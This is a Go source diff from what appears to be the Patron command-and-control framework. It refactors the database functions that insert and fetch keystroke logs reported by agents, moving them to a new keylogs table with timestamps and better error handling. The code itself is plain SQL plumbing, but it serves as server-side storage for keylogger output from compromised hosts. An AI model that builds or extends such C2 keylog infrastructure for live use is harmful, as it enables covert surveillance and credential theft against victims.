@@ -1,69 +1,62 @@
 package data
 
 import (
-	"log"
-
 	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
-	"github.com/PatronC2/Patron/helper"
 	"github.com/PatronC2/Patron/lib/logger"
 	"github.com/PatronC2/Patron/types"
 	_ "github.com/lib/pq"
 )
 
-func CreateKeys(uuid string) error {
-	CreateKeysSQL := `
-        INSERT INTO "Keylog" ("UUID", "Keys")
-        VALUES ($1, $2)`
+func InsertKeylog(req *patronobuf.KeysRequest) error {
 
-	_, err := db.Exec(CreateKeysSQL, uuid, "")
-	if err != nil {
-		logger.Logf(logger.Error, "Error creating keylog entry in DB for UUID %s: %v", uuid, err)
-		return err
+	keys_string := req.GetKeys()
+	agent_uuid := req.GetUuid()
+
+	if keys_string == "" {
+		logger.Logf(logger.Debug, "Nothing useful to insert, skipping write for agent: %v", agent_uuid)
+		return nil
 	}
 
-	logger.Logf(logger.Info, "New keylog entry created for agent %s", uuid)
+	sql := `
+	INSERT INTO keylogs (uuid, contents)
+	VALUES ($1, $2)`
+
+	_, err := db.Exec(sql, agent_uuid, keys_string)
+	if err != nil {
+		logger.Logf(logger.Error, "Error inserting log for UUID %s: %v", agent_uuid, err)
+		return err
+	}
 	return nil
 }
 
-func UpdateAgentKeys(req *patronobuf.KeysRequest) error {
-	const sqlStmt = `
-        UPDATE "Keylog"
-        SET "Keys" = "Keys" || $1
-        WHERE "UUID" = $2
-    `
-	_, err := db.Exec(sqlStmt, req.GetKeys(), req.GetUuid())
-	if err != nil {
-		logger.Logf(logger.Error, "Error updating keys for UUID %s: %v", req.GetUuid(), err)
-		return err
-	}
-
-	logger.Logf(logger.Info, "Successfully updated keys for UUID %s", req.GetUuid())
-	return nil
-}
-
-func Keylog(uuid string) []types.KeysRequest {
-	var info types.KeysRequest
-	FetchSQL := `
-	SELECT 
-		"UUID",
-		"Keys"
-	FROM "Keylog"
-	WHERE "UUID"= $1
-	ORDER BY "KeylogID" asc;
+func GetKeylogs(uuid string) ([]types.KeysRequest, error) {
+	const q = `
+		SELECT uuid, contents, created_at
+		FROM keylogs
+		WHERE uuid = $1
+		ORDER BY keylog_id ASC;
 	`
-	row, err := db.Query(FetchSQL, uuid)
+
+	rows, err := db.Query(q, uuid)
 	if err != nil {
-		log.Fatal(err)
+		return nil, err
 	}
-	defer row.Close()
-	var infoAppend []types.KeysRequest
-	for row.Next() {
-		row.Scan(
-			&info.AgentID,
-			&info.Keys,
-		)
-		info.Keys = helper.FormatKeyLogs(info.Keys)
-		infoAppend = append(infoAppend, info)
+	defer rows.Close()
+
+	out := make([]types.KeysRequest, 0, 64)
+
+	for rows.Next() {
+		var kr types.KeysRequest
+		if err := rows.Scan(&kr.AgentID, &kr.Contents, &kr.CreatedAt); err != nil {
+			return nil, err
+		}
+		out = append(out, kr)
 	}
-	return infoAppend
+
+	if err := rows.Err(); err != nil {
+		logger.Logf(logger.Error, "Error getting keylogs from DB: %v", err)
+		return nil, err
+	}
+
+	return out, nil
 }
